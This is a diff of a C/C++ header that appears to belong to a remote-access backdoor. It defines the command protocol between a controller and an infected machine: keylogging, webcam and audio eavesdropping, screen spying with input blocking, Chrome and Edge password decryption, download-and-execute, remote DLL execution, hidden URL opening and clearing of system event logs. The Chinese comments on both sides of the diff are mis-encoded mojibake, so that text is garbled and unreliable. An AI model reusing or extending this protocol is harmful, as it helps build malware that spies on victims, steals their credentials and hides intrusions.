@@ -1,4 +1,4 @@
-#pragma once
+ï»¿#pragma once
 #include <vector>
 #include <string>
 #include <iosfwd>
@@ -17,7 +17,7 @@
 #include <corecrt_io.h>
 #define MVirtualFree(a1, a2, a3) VirtualFree(a1, a2, a3)
 #define MVirtualAlloc(a1, a2, a3, a4) VirtualAlloc(a1, a2, a3, a4)
-#else // Ê¹µÃ¸ÃÍ·ÎÄ¼şÔÚ LINUX Õı³£Ê¹ÓÃ
+#else // ä½¿å¾—è¯¥å¤´æ–‡ä»¶åœ¨ LINUX æ­£å¸¸ä½¿ç”¨
 #include <thread>
 #define strcat_s strcat
 #define sprintf_s sprintf
@@ -67,7 +67,7 @@ typedef void* LPVOID, * HANDLE;
 #define _MAX_PATH 260
 #endif
 
-// ÒÔÏÂ2¸öÊı×ÖĞèÈ«¾ÖÎ¨Ò»£¬·ñÔòÔÚÉú³É·şÎñÊ±»á³öÎÊÌâ
+// ä»¥ä¸‹2ä¸ªæ•°å­—éœ€å…¨å±€å”¯ä¸€ï¼Œå¦åˆ™åœ¨ç”ŸæˆæœåŠ¡æ—¶ä¼šå‡ºé—®é¢˜
 
 #define FLAG_FINDEN "Hello, World!"
 
@@ -100,12 +100,12 @@ inline int isValid_10s()
     return span <= 10;
 }
 
-// µ±³ÌĞò¹¦ÄÜÃ÷ÏÔ·¢Éú±ä»¯Ê±£¬Ó¦¸Ã¸üĞÂÕâ¸öÖµ£¬ÒÔ±ã¶Ô±»¿Ø³ÌĞò½øĞĞÇø·Ö
-#define DLL_VERSION __DATE__		// DLL°æ±¾
+// å½“ç¨‹åºåŠŸèƒ½æ˜æ˜¾å‘ç”Ÿå˜åŒ–æ—¶ï¼Œåº”è¯¥æ›´æ–°è¿™ä¸ªå€¼ï¼Œä»¥ä¾¿å¯¹è¢«æ§ç¨‹åºè¿›è¡ŒåŒºåˆ†
+#define DLL_VERSION __DATE__		// DLLç‰ˆæœ¬
 
-#define TALK_DLG_MAXLEN 1024		// ×î´óÊäÈë×Ö·û³¤¶È
+#define TALK_DLG_MAXLEN 1024		// æœ€å¤§è¾“å…¥å­—ç¬¦é•¿åº¦
 
-// ¿Í»§¶Ë×´Ì¬: 1-±»¿Ø¶ËÍË³ö 2-Ö÷¿Ø¶ËÍË³ö
+// å®¢æˆ·ç«¯çŠ¶æ€: 1-è¢«æ§ç«¯é€€å‡º 2-ä¸»æ§ç«¯é€€å‡º
 enum State {
     S_CLIENT_NORMAL = 0,
     S_CLIENT_EXIT = 1,
@@ -113,165 +113,165 @@ enum State {
     S_CLIENT_UPDATE = 3,
 };
 
-// ÃüÁîÃ¶¾ÙÁĞ±í
+// å‘½ä»¤æšä¸¾åˆ—è¡¨
 enum {
-    // ÎÄ¼ş´«Êä·½Ê½
-    TRANSFER_MODE_NORMAL = 0x00,	// Ò»°ã,Èç¹û±¾µØ»òÕßÔ¶³ÌÒÑ¾­ÓĞ£¬È¡Ïû
-    TRANSFER_MODE_ADDITION,			// ×·¼Ó
-    TRANSFER_MODE_ADDITION_ALL,		// È«²¿×·¼Ó
-    TRANSFER_MODE_OVERWRITE,		// ¸²¸Ç
-    TRANSFER_MODE_OVERWRITE_ALL,	// È«²¿¸²¸Ç
-    TRANSFER_MODE_JUMP,				// ¸²¸Ç
-    TRANSFER_MODE_JUMP_ALL,			// È«²¿¸²¸Ç
-    TRANSFER_MODE_CANCEL,			// È¡Ïû´«ËÍ
+    // æ–‡ä»¶ä¼ è¾“æ–¹å¼
+    TRANSFER_MODE_NORMAL = 0x00,	// ä¸€èˆ¬,å¦‚æœæœ¬åœ°æˆ–è€…è¿œç¨‹å·²ç»æœ‰ï¼Œå–æ¶ˆ
+    TRANSFER_MODE_ADDITION,			// è¿½åŠ 
+    TRANSFER_MODE_ADDITION_ALL,		// å…¨éƒ¨è¿½åŠ 
+    TRANSFER_MODE_OVERWRITE,		// è¦†ç›–
+    TRANSFER_MODE_OVERWRITE_ALL,	// å…¨éƒ¨è¦†ç›–
+    TRANSFER_MODE_JUMP,				// è¦†ç›–
+    TRANSFER_MODE_JUMP_ALL,			// å…¨éƒ¨è¦†ç›–
+    TRANSFER_MODE_CANCEL,			// å–æ¶ˆä¼ é€
 
-    // ¿ØÖÆ¶Ë·¢³öµÄÃüÁî
-    COMMAND_ACTIVED = 0x00,			// ·şÎñ¶Ë¿ÉÒÔ¼¤»î¿ªÊ¼¹¤×÷
-    COMMAND_LIST_DRIVE,				// ÁĞ³ö´ÅÅÌÄ¿Â¼
-    COMMAND_LIST_FILES,				// ÁĞ³öÄ¿Â¼ÖĞµÄÎÄ¼ş
-    COMMAND_DOWN_FILES,				// ÏÂÔØÎÄ¼ş
-    COMMAND_FILE_SIZE,				// ÉÏ´«Ê±µÄÎÄ¼ş´óĞ¡
-    COMMAND_FILE_DATA,				// ÉÏ´«Ê±µÄÎÄ¼şÊı¾İ
-    COMMAND_EXCEPTION,				// ´«Êä·¢ÉúÒì³££¬ĞèÒªÖØĞÂ´«Êä
-    COMMAND_CONTINUE,				// ´«ÊäÕı³££¬ÇëÇó¼ÌĞø·¢ËÍÊı¾İ
-    COMMAND_STOP,					// ´«ÊäÖĞÖ¹
-    COMMAND_DELETE_FILE,			// É¾³ıÎÄ¼ş
-    COMMAND_DELETE_DIRECTORY,		// É¾³ıÄ¿Â¼
-    COMMAND_SET_TRANSFER_MODE,		// ÉèÖÃ´«Êä·½Ê½
-    COMMAND_CREATE_FOLDER,			// ´´½¨ÎÄ¼ş¼Ğ
-    COMMAND_RENAME_FILE,			// ÎÄ¼ş»òÎÄ¼ş¸ÄÃû
-    COMMAND_OPEN_FILE_SHOW,			// ÏÔÊ¾´ò¿ªÎÄ¼ş
-    COMMAND_OPEN_FILE_HIDE,			// Òş²Ø´ò¿ªÎÄ¼ş
+    // æ§åˆ¶ç«¯å‘å‡ºçš„å‘½ä»¤
+    COMMAND_ACTIVED = 0x00,			// æœåŠ¡ç«¯å¯ä»¥æ¿€æ´»å¼€å§‹å·¥ä½œ
+    COMMAND_LIST_DRIVE,				// åˆ—å‡ºç£ç›˜ç›®å½•
+    COMMAND_LIST_FILES,				// åˆ—å‡ºç›®å½•ä¸­çš„æ–‡ä»¶
+    COMMAND_DOWN_FILES,				// ä¸‹è½½æ–‡ä»¶
+    COMMAND_FILE_SIZE,				// ä¸Šä¼ æ—¶çš„æ–‡ä»¶å¤§å°
+    COMMAND_FILE_DATA,				// ä¸Šä¼ æ—¶çš„æ–‡ä»¶æ•°æ®
+    COMMAND_EXCEPTION,				// ä¼ è¾“å‘ç”Ÿå¼‚å¸¸ï¼Œéœ€è¦é‡æ–°ä¼ è¾“
+    COMMAND_CONTINUE,				// ä¼ è¾“æ­£å¸¸ï¼Œè¯·æ±‚ç»§ç»­å‘é€æ•°æ®
+    COMMAND_STOP,					// ä¼ è¾“ä¸­æ­¢
+    COMMAND_DELETE_FILE,			// åˆ é™¤æ–‡ä»¶
+    COMMAND_DELETE_DIRECTORY,		// åˆ é™¤ç›®å½•
+    COMMAND_SET_TRANSFER_MODE,		// è®¾ç½®ä¼ è¾“æ–¹å¼
+    COMMAND_CREATE_FOLDER,			// åˆ›å»ºæ–‡ä»¶å¤¹
+    COMMAND_RENAME_FILE,			// æ–‡ä»¶æˆ–æ–‡ä»¶æ”¹å
+    COMMAND_OPEN_FILE_SHOW,			// æ˜¾ç¤ºæ‰“å¼€æ–‡ä»¶
+    COMMAND_OPEN_FILE_HIDE,			// éšè—æ‰“å¼€æ–‡ä»¶
 
-    COMMAND_SCREEN_SPY,				// ÆÁÄ»²é¿´
-    COMMAND_SCREEN_RESET,			// ¸Ä±äÆÁÄ»Éî¶È
-    COMMAND_ALGORITHM_RESET,		// ¸Ä±äËã·¨
-    COMMAND_SCREEN_CTRL_ALT_DEL,	// ·¢ËÍCtrl+Alt+Del
-    COMMAND_SCREEN_CONTROL,			// ÆÁÄ»¿ØÖÆ
-    COMMAND_SCREEN_BLOCK_INPUT,		// Ëø¶¨·şÎñ¶Ë¼üÅÌÊó±êÊäÈë
-    COMMAND_SCREEN_BLANK,			// ·şÎñ¶ËºÚÆÁ
-    COMMAND_SCREEN_CAPTURE_LAYER,	// ²¶×½²ã
-    COMMAND_SCREEN_GET_CLIPBOARD,	// »ñÈ¡Ô¶³Ì¼ôÌù°æ
-    COMMAND_SCREEN_SET_CLIPBOARD,	// ÉèÖÃÔ¶³Ì¼ôÌû°æ
+    COMMAND_SCREEN_SPY,				// å±å¹•æŸ¥çœ‹
+    COMMAND_SCREEN_RESET,			// æ”¹å˜å±å¹•æ·±åº¦
+    COMMAND_ALGORITHM_RESET,		// æ”¹å˜ç®—æ³•
+    COMMAND_SCREEN_CTRL_ALT_DEL,	// å‘é€Ctrl+Alt+Del
+    COMMAND_SCREEN_CONTROL,			// å±å¹•æ§åˆ¶
+    COMMAND_SCREEN_BLOCK_INPUT,		// é”å®šæœåŠ¡ç«¯é”®ç›˜é¼ æ ‡è¾“å…¥
+    COMMAND_SCREEN_BLANK,			// æœåŠ¡ç«¯é»‘å±
+    COMMAND_SCREEN_CAPTURE_LAYER,	// æ•æ‰å±‚
+    COMMAND_SCREEN_GET_CLIPBOARD,	// è·å–è¿œç¨‹å‰ªè´´ç‰ˆ
+    COMMAND_SCREEN_SET_CLIPBOARD,	// è®¾ç½®è¿œç¨‹å‰ªå¸–ç‰ˆ
 
-    COMMAND_WEBCAM,					// ÉãÏñÍ·
-    COMMAND_WEBCAM_ENABLECOMPRESS,	// ÉãÏñÍ·Êı¾İÒªÇó¾­¹ıH263Ñ¹Ëõ
-    COMMAND_WEBCAM_DISABLECOMPRESS,	// ÉãÏñÍ·Êı¾İÒªÇóÔ­Ê¼¸ßÇåÄ£Ê½
-    COMMAND_WEBCAM_RESIZE,			// ÉãÏñÍ·µ÷Õû·Ö±çÂÊ£¬ºóÃæ¸úÁ½¸öINTĞÍµÄ¿í¸ß
-    COMMAND_NEXT,					// ÏÂÒ»²½(¿ØÖÆ¶ËÒÑ¾­´ò¿ª¶Ô»°¿ò)
+    COMMAND_WEBCAM,					// æ‘„åƒå¤´
+    COMMAND_WEBCAM_ENABLECOMPRESS,	// æ‘„åƒå¤´æ•°æ®è¦æ±‚ç»è¿‡H263å‹ç¼©
+    COMMAND_WEBCAM_DISABLECOMPRESS,	// æ‘„åƒå¤´æ•°æ®è¦æ±‚åŸå§‹é«˜æ¸…æ¨¡å¼
+    COMMAND_WEBCAM_RESIZE,			// æ‘„åƒå¤´è°ƒæ•´åˆ†è¾©ç‡ï¼Œåé¢è·Ÿä¸¤ä¸ªINTå‹çš„å®½é«˜
+    COMMAND_NEXT,					// ä¸‹ä¸€æ­¥(æ§åˆ¶ç«¯å·²ç»æ‰“å¼€å¯¹è¯æ¡†)
 
-    COMMAND_KEYBOARD,				// ¼üÅÌ¼ÇÂ¼
-    COMMAND_KEYBOARD_OFFLINE,		// ¿ªÆôÀëÏß¼üÅÌ¼ÇÂ¼
-    COMMAND_KEYBOARD_CLEAR,			// Çå³ı¼üÅÌ¼ÇÂ¼ÄÚÈİ
+    COMMAND_KEYBOARD,				// é”®ç›˜è®°å½•
+    COMMAND_KEYBOARD_OFFLINE,		// å¼€å¯ç¦»çº¿é”®ç›˜è®°å½•
+    COMMAND_KEYBOARD_CLEAR,			// æ¸…é™¤é”®ç›˜è®°å½•å†…å®¹
 
-    COMMAND_AUDIO,					// ÓïÒô¼àÌı
+    COMMAND_AUDIO,					// è¯­éŸ³ç›‘å¬
 
-    COMMAND_SYSTEM,					// ÏµÍ³¹ÜÀí£¨½ø³Ì£¬´°¿Ú....£©
-    COMMAND_PSLIST,					// ½ø³ÌÁĞ±í
-    COMMAND_WSLIST,					// ´°¿ÚÁĞ±í
-    COMMAND_DIALUPASS,				// ²¦ºÅÃÜÂë
-    COMMAND_KILLPROCESS,			// ¹Ø±Õ½ø³Ì
+    COMMAND_SYSTEM,					// ç³»ç»Ÿç®¡ç†ï¼ˆè¿›ç¨‹ï¼Œçª—å£....ï¼‰
+    COMMAND_PSLIST,					// è¿›ç¨‹åˆ—è¡¨
+    COMMAND_WSLIST,					// çª—å£åˆ—è¡¨
+    COMMAND_DIALUPASS,				// æ‹¨å·å¯†ç 
+    COMMAND_KILLPROCESS,			// å…³é—­è¿›ç¨‹
     COMMAND_SHELL,					// cmdshell
-    COMMAND_SESSION,				// »á»°¹ÜÀí£¨¹Ø»ú£¬ÖØÆô£¬×¢Ïú, Ğ¶ÔØ£©
-    COMMAND_REMOVE,					// Ğ¶ÔØºóÃÅ
-    COMMAND_DOWN_EXEC,				// ÆäËü¹¦ÄÜ - ÏÂÔØÖ´ĞĞ
-    COMMAND_UPLOAD_EXEC,			// ÆäËü¹¦ÄÜ - ÉÏ´«Ö´ĞĞ
-    COMMAND_CLEAN_EVENT,			// ÆäËü¹ÜÀí - Çå³ıÏµÍ³ÈÕÖ¾
-    COMMAND_OPEN_URL_HIDE,			// ÆäËü¹ÜÀí - Òş²Ø´ò¿ªÍøÒ³
-    COMMAND_OPEN_URL_SHOW,			// ÆäËü¹ÜÀí - ÏÔÊ¾´ò¿ªÍøÒ³
-    COMMAND_RENAME_REMARK,			// ÖØÃüÃû±¸×¢
-    COMMAND_REPLAY_HEARTBEAT,		// »Ø¸´ĞÄÌø°ü
-    COMMAND_SERVICES,				// ·şÎñ¹ÜÀí
+    COMMAND_SESSION,				// ä¼šè¯ç®¡ç†ï¼ˆå…³æœºï¼Œé‡å¯ï¼Œæ³¨é”€, å¸è½½ï¼‰
+    COMMAND_REMOVE,					// å¸è½½åé—¨
+    COMMAND_DOWN_EXEC,				// å…¶å®ƒåŠŸèƒ½ - ä¸‹è½½æ‰§è¡Œ
+    COMMAND_UPLOAD_EXEC,			// å…¶å®ƒåŠŸèƒ½ - ä¸Šä¼ æ‰§è¡Œ
+    COMMAND_CLEAN_EVENT,			// å…¶å®ƒç®¡ç† - æ¸…é™¤ç³»ç»Ÿæ—¥å¿—
+    COMMAND_OPEN_URL_HIDE,			// å…¶å®ƒç®¡ç† - éšè—æ‰“å¼€ç½‘é¡µ
+    COMMAND_OPEN_URL_SHOW,			// å…¶å®ƒç®¡ç† - æ˜¾ç¤ºæ‰“å¼€ç½‘é¡µ
+    COMMAND_RENAME_REMARK,			// é‡å‘½åå¤‡æ³¨
+    COMMAND_REPLAY_HEARTBEAT,		// å›å¤å¿ƒè·³åŒ…
+    COMMAND_SERVICES,				// æœåŠ¡ç®¡ç†
     COMMAND_REGEDIT,
-    COMMAND_TALK,					// ¼´Ê±ÏûÏ¢ÑéÖ¤
-    COMMAND_UPDATE = 53,			// ¿Í»§¶ËÉı¼¶
-    COMMAND_SHARE = 59,				// ·ÖÏíÖ÷»ú
-    COMMAND_PROXY = 60,				// ´úÀíÓ³Éä
-    TOKEN_SYSINFOLIST = 61,			// Ö÷»ú¹ÜÀí
-    TOKEN_CHAT_START = 62,			// Ô¶³Ì½»Ì¸
-    TOKEN_UNINSTALL = 63,			// Ğ¶ÔØÖ÷»ú
-    TOKEN_PRIVATESCREEN = 64,		// ÒşË½ÆÁÄ»
-    TOKEN_MACHINE_MANAGE = 65,      // »úÆ÷¹ÜÀí
-    COMMAND_GET_FOLDER = 66,        // »ñÈ¡Ä¿Â¼
-    COMMAND_GET_FILE = 67,          // »ñÈ¡ÎÄ¼ş
-    COMMAND_SEND_FILE = 68,         // ·¢ËÍÎÄ¼ş
+    COMMAND_TALK,					// å³æ—¶æ¶ˆæ¯éªŒè¯
+    COMMAND_UPDATE = 53,			// å®¢æˆ·ç«¯å‡çº§
+    COMMAND_SHARE = 59,				// åˆ†äº«ä¸»æœº
+    COMMAND_PROXY = 60,				// ä»£ç†æ˜ å°„
+    TOKEN_SYSINFOLIST = 61,			// ä¸»æœºç®¡ç†
+    TOKEN_CHAT_START = 62,			// è¿œç¨‹äº¤è°ˆ
+    TOKEN_UNINSTALL = 63,			// å¸è½½ä¸»æœº
+    TOKEN_PRIVATESCREEN = 64,		// éšç§å±å¹•
+    TOKEN_MACHINE_MANAGE = 65,      // æœºå™¨ç®¡ç†
+    COMMAND_GET_FOLDER = 66,        // è·å–ç›®å½•
+    COMMAND_GET_FILE = 67,          // è·å–æ–‡ä»¶
+    COMMAND_SEND_FILE = 68,         // å‘é€æ–‡ä»¶
     COMMAND_SWITCH_SCREEN = 69,
     CMD_MULTITHREAD_COMPRESS = 70,
     CMD_FPS = 71,
 
-    // ·şÎñ¶Ë·¢³öµÄ±êÊ¶
-    TOKEN_AUTH = 100,				// ÒªÇóÑéÖ¤
-    TOKEN_HEARTBEAT,				// ĞÄÌø°ü
-    TOKEN_LOGIN,					// ÉÏÏß°ü
-    TOKEN_DRIVE_LIST,				// Çı¶¯Æ÷ÁĞ±í
-    TOKEN_FILE_LIST,				// ÎÄ¼şÁĞ±í
-    TOKEN_FILE_SIZE,				// ÎÄ¼ş´óĞ¡£¬´«ÊäÎÄ¼şÊ±ÓÃ
-    TOKEN_FILE_DATA,				// ÎÄ¼şÊı¾İ
-    TOKEN_TRANSFER_FINISH,			// ´«ÊäÍê±Ï
-    TOKEN_DELETE_FINISH,			// É¾³ıÍê±Ï
-    TOKEN_GET_TRANSFER_MODE,		// µÃµ½ÎÄ¼ş´«Êä·½Ê½
-    TOKEN_GET_FILEDATA,				// Ô¶³ÌµÃµ½±¾µØÎÄ¼şÊı¾İ
-    TOKEN_CREATEFOLDER_FINISH,		// ´´½¨ÎÄ¼ş¼ĞÈÎÎñÍê³É
-    TOKEN_DATA_CONTINUE,			// ¼ÌĞø´«ÊäÊı¾İ
-    TOKEN_RENAME_FINISH,			// ¸ÄÃû²Ù×÷Íê³É
-    TOKEN_EXCEPTION,				// ²Ù×÷·¢ÉúÒì³£
+    // æœåŠ¡ç«¯å‘å‡ºçš„æ ‡è¯†
+    TOKEN_AUTH = 100,				// è¦æ±‚éªŒè¯
+    TOKEN_HEARTBEAT,				// å¿ƒè·³åŒ…
+    TOKEN_LOGIN,					// ä¸Šçº¿åŒ…
+    TOKEN_DRIVE_LIST,				// é©±åŠ¨å™¨åˆ—è¡¨
+    TOKEN_FILE_LIST,				// æ–‡ä»¶åˆ—è¡¨
+    TOKEN_FILE_SIZE,				// æ–‡ä»¶å¤§å°ï¼Œä¼ è¾“æ–‡ä»¶æ—¶ç”¨
+    TOKEN_FILE_DATA,				// æ–‡ä»¶æ•°æ®
+    TOKEN_TRANSFER_FINISH,			// ä¼ è¾“å®Œæ¯•
+    TOKEN_DELETE_FINISH,			// åˆ é™¤å®Œæ¯•
+    TOKEN_GET_TRANSFER_MODE,		// å¾—åˆ°æ–‡ä»¶ä¼ è¾“æ–¹å¼
+    TOKEN_GET_FILEDATA,				// è¿œç¨‹å¾—åˆ°æœ¬åœ°æ–‡ä»¶æ•°æ®
+    TOKEN_CREATEFOLDER_FINISH,		// åˆ›å»ºæ–‡ä»¶å¤¹ä»»åŠ¡å®Œæˆ
+    TOKEN_DATA_CONTINUE,			// ç»§ç»­ä¼ è¾“æ•°æ®
+    TOKEN_RENAME_FINISH,			// æ”¹åæ“ä½œå®Œæˆ
+    TOKEN_EXCEPTION,				// æ“ä½œå‘ç”Ÿå¼‚å¸¸
 
-    TOKEN_BITMAPINFO,				// ÆÁÄ»²é¿´µÄBITMAPINFO
-    TOKEN_FIRSTSCREEN,				// ÆÁÄ»²é¿´µÄµÚÒ»ÕÅÍ¼
-    TOKEN_NEXTSCREEN,				// ÆÁÄ»²é¿´µÄÏÂÒ»ÕÅÍ¼
-    TOKEN_CLIPBOARD_TEXT,			// ÆÁÄ»²é¿´Ê±·¢ËÍ¼ôÌû°æÄÚÈİ
+    TOKEN_BITMAPINFO,				// å±å¹•æŸ¥çœ‹çš„BITMAPINFO
+    TOKEN_FIRSTSCREEN,				// å±å¹•æŸ¥çœ‹çš„ç¬¬ä¸€å¼ å›¾
+    TOKEN_NEXTSCREEN,				// å±å¹•æŸ¥çœ‹çš„ä¸‹ä¸€å¼ å›¾
+    TOKEN_CLIPBOARD_TEXT,			// å±å¹•æŸ¥çœ‹æ—¶å‘é€å‰ªå¸–ç‰ˆå†…å®¹
 
-    TOKEN_WEBCAM_BITMAPINFO,		// ÉãÏñÍ·µÄBITMAPINFOHEADER
-    TOKEN_WEBCAM_DIB,				// ÉãÏñÍ·µÄÍ¼ÏñÊı¾İ
+    TOKEN_WEBCAM_BITMAPINFO,		// æ‘„åƒå¤´çš„BITMAPINFOHEADER
+    TOKEN_WEBCAM_DIB,				// æ‘„åƒå¤´çš„å›¾åƒæ•°æ®
 
-    TOKEN_AUDIO_START,				// ¿ªÊ¼ÓïÒô¼àÌı
-    TOKEN_AUDIO_DATA,				// ÓïÒô¼àÌıÊı¾İ
+    TOKEN_AUDIO_START,				// å¼€å§‹è¯­éŸ³ç›‘å¬
+    TOKEN_AUDIO_DATA,				// è¯­éŸ³ç›‘å¬æ•°æ®
 
-    TOKEN_KEYBOARD_START,			// ¼üÅÌ¼ÇÂ¼¿ªÊ¼
-    TOKEN_KEYBOARD_DATA,			// ¼üÅÌ¼ÇÂ¼µÄÊı¾İ
+    TOKEN_KEYBOARD_START,			// é”®ç›˜è®°å½•å¼€å§‹
+    TOKEN_KEYBOARD_DATA,			// é”®ç›˜è®°å½•çš„æ•°æ®
 
-    TOKEN_PSLIST,					// ½ø³ÌÁĞ±í
-    TOKEN_WSLIST,					// ´°¿ÚÁĞ±í
-    TOKEN_DIALUPASS,				// ²¦ºÅÃÜÂë
-    TOKEN_SHELL_START,				// Ô¶³ÌÖÕ¶Ë¿ªÊ¼
-    TOKEN_SERVERLIST,               // ·şÎñÁĞ±í
-    COMMAND_SERVICELIST,            // Ë¢ĞÂ·şÎñÁĞ±í
-    COMMAND_SERVICECONFIG,          // ·şÎñ¶Ë·¢³öµÄ±êÊ¶
-    TOKEN_TALK_START,				// ¼´Ê±ÏûÏ¢¿ªÊ¼
-    TOKEN_TALKCMPLT,				// ¼´Ê±ÏûÏ¢¿ÉÖØ·¢
-    TOKEN_KEYFRAME=134,				// ¹Ø¼üÖ¡
-    TOKEN_BITMAPINFO_HIDE,          // ĞéÄâÆÁÄ»
-    TOKEN_SCREEN_SIZE,              // ÆÁÄ»´óĞ¡
-    TOKEN_DRIVE_LIST_PLUGIN = 150,	// ÎÄ¼ş¹ÜÀí(²å¼ş)
-    TOKEN_DRAWING_BOARD=151,		// »­°å
+    TOKEN_PSLIST,					// è¿›ç¨‹åˆ—è¡¨
+    TOKEN_WSLIST,					// çª—å£åˆ—è¡¨
+    TOKEN_DIALUPASS,				// æ‹¨å·å¯†ç 
+    TOKEN_SHELL_START,				// è¿œç¨‹ç»ˆç«¯å¼€å§‹
+    TOKEN_SERVERLIST,               // æœåŠ¡åˆ—è¡¨
+    COMMAND_SERVICELIST,            // åˆ·æ–°æœåŠ¡åˆ—è¡¨
+    COMMAND_SERVICECONFIG,          // æœåŠ¡ç«¯å‘å‡ºçš„æ ‡è¯†
+    TOKEN_TALK_START,				// å³æ—¶æ¶ˆæ¯å¼€å§‹
+    TOKEN_TALKCMPLT,				// å³æ—¶æ¶ˆæ¯å¯é‡å‘
+    TOKEN_KEYFRAME=134,				// å…³é”®å¸§
+    TOKEN_BITMAPINFO_HIDE,          // è™šæ‹Ÿå±å¹•
+    TOKEN_SCREEN_SIZE,              // å±å¹•å¤§å°
+    TOKEN_DRIVE_LIST_PLUGIN = 150,	// æ–‡ä»¶ç®¡ç†(æ’ä»¶)
+    TOKEN_DRAWING_BOARD=151,		// ç”»æ¿
 
     TOKEN_DECRYPT = 199,
-    TOKEN_REGEDIT = 200,            // ×¢²á±í
-    COMMAND_REG_FIND,				// ×¢²á±í ¹ÜÀí±êÊ¶
+    TOKEN_REGEDIT = 200,            // æ³¨å†Œè¡¨
+    COMMAND_REG_FIND,				// æ³¨å†Œè¡¨ ç®¡ç†æ ‡è¯†
     TOKEN_REG_KEY,
     TOKEN_REG_PATH,
-    COMMAND_BYE,					// ±»¿Ø¶ËÍË³ö
-    SERVER_EXIT=205,				// Ö÷¿Ø¶ËÍË³ö
+    COMMAND_BYE,					// è¢«æ§ç«¯é€€å‡º
+    SERVER_EXIT=205,				// ä¸»æ§ç«¯é€€å‡º
 
     COMMAND_CC,						// CC
-    COMMAND_ASSIGN_MASTER,			// ·ÖÅäÖ÷¿Ø
-    COMMAND_FILE_DETECT,			// ÎÄ¼şÌ½²â
-    COMMAND_FILE_REPORT,			// ÎÄ¼şÉÏ±¨
+    COMMAND_ASSIGN_MASTER,			// åˆ†é…ä¸»æ§
+    COMMAND_FILE_DETECT,			// æ–‡ä»¶æ¢æµ‹
+    COMMAND_FILE_REPORT,			// æ–‡ä»¶ä¸ŠæŠ¥
 
-    SOCKET_DLLLOADER=210,           // ¿Í»§¶ËÇëÇóDLL
-    CMD_DLLDATA,                    // ÏìÓ¦DLLÊı¾İ
-    CMD_RUNASADMIN=214,             // ADMIN ÔËĞĞ
-    CMD_MASTERSETTING = 215,		// Ö÷¿ØÉèÖÃ
-    CMD_HEARTBEAT_ACK = 216,		// ĞÄÌø»ØÓ¦
+    SOCKET_DLLLOADER=210,           // å®¢æˆ·ç«¯è¯·æ±‚DLL
+    CMD_DLLDATA,                    // å“åº”DLLæ•°æ®
+    CMD_RUNASADMIN=214,             // ADMIN è¿è¡Œ
+    CMD_MASTERSETTING = 215,		// ä¸»æ§è®¾ç½®
+    CMD_HEARTBEAT_ACK = 216,		// å¿ƒè·³å›åº”
     CMD_PADDING =217,
-    CMD_AUTHORIZATION = 222,		// ÊÚÈ¨
-    CMD_SERVER_ADDR = 229,          // Ö÷¿ØµØÖ·
-    TOKEN_ERROR = 230,              // ´íÎóÌáÊ¾
-    TOKEN_SHELL_DATA = 231,         // ÖÕ¶Ë½á¹û
-    CMD_EXECUTE_DLL = 240,			// Ö´ĞĞ´úÂë
-    TOKEN_CLIENT_MSG = 241,         // ¿Í»§¶ËÏûÏ¢
-    CMD_SET_GROUP = 242,            // ĞŞ¸Ä·Ö×é
-    CMD_EXECUTE_DLL_NEW = 243,	    // Ö´ĞĞ´úÂë
+    CMD_AUTHORIZATION = 222,		// æˆæƒ
+    CMD_SERVER_ADDR = 229,          // ä¸»æ§åœ°å€
+    TOKEN_ERROR = 230,              // é”™è¯¯æç¤º
+    TOKEN_SHELL_DATA = 231,         // ç»ˆç«¯ç»“æœ
+    CMD_EXECUTE_DLL = 240,			// æ‰§è¡Œä»£ç 
+    TOKEN_CLIENT_MSG = 241,         // å®¢æˆ·ç«¯æ¶ˆæ¯
+    CMD_SET_GROUP = 242,            // ä¿®æ”¹åˆ†ç»„
+    CMD_EXECUTE_DLL_NEW = 243,	    // æ‰§è¡Œä»£ç 
 };
 
 enum MachineCommand {
@@ -291,15 +291,15 @@ enum ProxyManager {
     COMMAND_PROXY_CONNECT_HOSTNAME,
 };
 
-// ºóÌ¨ÆÁÄ»ÆäËûÃüÁî
+// åå°å±å¹•å…¶ä»–å‘½ä»¤
 enum HideScreenSpy {
-    COMMAND_FLUSH_HIDE,             // Ë¢ĞÂÆÁÄ»
-    COMMAND_SCREEN_SETSCREEN_HIDE,  // ÖØÖÃ·Ö±æÂÊ
-    COMMAND_HIDE_USER,              // ×Ô¶¨ÒåÃüÁî
-    COMMAND_HIDE_CLEAR,             // ÇåÀíºóÌ¨
-    COMMAND_COMMAND_SCREENUALITY60_HIDE, // ÇåÎú¶È
-    COMMAND_COMMAND_SCREENUALITY85_HIDE, // ÇåÎú¶È
-    COMMAND_COMMAND_SCREENUALITY100_HIDE, // ÇåÎú¶È
+    COMMAND_FLUSH_HIDE,             // åˆ·æ–°å±å¹•
+    COMMAND_SCREEN_SETSCREEN_HIDE,  // é‡ç½®åˆ†è¾¨ç‡
+    COMMAND_HIDE_USER,              // è‡ªå®šä¹‰å‘½ä»¤
+    COMMAND_HIDE_CLEAR,             // æ¸…ç†åå°
+    COMMAND_COMMAND_SCREENUALITY60_HIDE, // æ¸…æ™°åº¦
+    COMMAND_COMMAND_SCREENUALITY85_HIDE, // æ¸…æ™°åº¦
+    COMMAND_COMMAND_SCREENUALITY100_HIDE, // æ¸…æ™°åº¦
 
     IDM_OPEN_Explorer = 33,
     IDM_OPEN_run,
@@ -328,7 +328,7 @@ struct ZdyCmd {
     char                cmdline[_MAX_PATH];
 };
 
-// ½âÃÜÊı¾İ
+// è§£å¯†æ•°æ®
 enum DecryptCommand {
     COMMAND_LLQ_GetChromePassWord,
     COMMAND_LLQ_GetEdgePassWord,
@@ -341,11 +341,11 @@ enum DecryptCommand {
 
 typedef DecryptCommand BroType;
 
-// ÕâÊÇ·şÎñ¹ÜÀíÒ³Ãæ¼ÈÓĞ¶¨Òå
-#define CMD_WINDOW_CLOSE	0		// ¹Ø±Õ´°¿Ú
-#define CMD_WINDOW_TEST		1		// ²Ù×÷´°¿Ú
+// è¿™æ˜¯æœåŠ¡ç®¡ç†é¡µé¢æ—¢æœ‰å®šä¹‰
+#define CMD_WINDOW_CLOSE	0		// å…³é—­çª—å£
+#define CMD_WINDOW_TEST		1		// æ“ä½œçª—å£
 
-// MachineManager ÏµÍ³¹ÜÀí, Ç°¼¸¸öÃ¶¾ÙÖµË³Ğò²»µÃĞŞ¸Ä
+// MachineManager ç³»ç»Ÿç®¡ç†, å‰å‡ ä¸ªæšä¸¾å€¼é¡ºåºä¸å¾—ä¿®æ”¹
 enum MachineManager {
     COMMAND_MACHINE_PROCESS,
     COMMAND_MACHINE_WINDOWS,
@@ -356,16 +356,16 @@ enum MachineManager {
     COMMAND_MACHINE_WIN32SERVICE,
     COMMAND_MACHINE_DRIVERSERVICE,
     COMMAND_MACHINE_TASK,
-    COMMAND_MACHINE_HOSTS, //²»ÄÜÂÒĞòºÅ
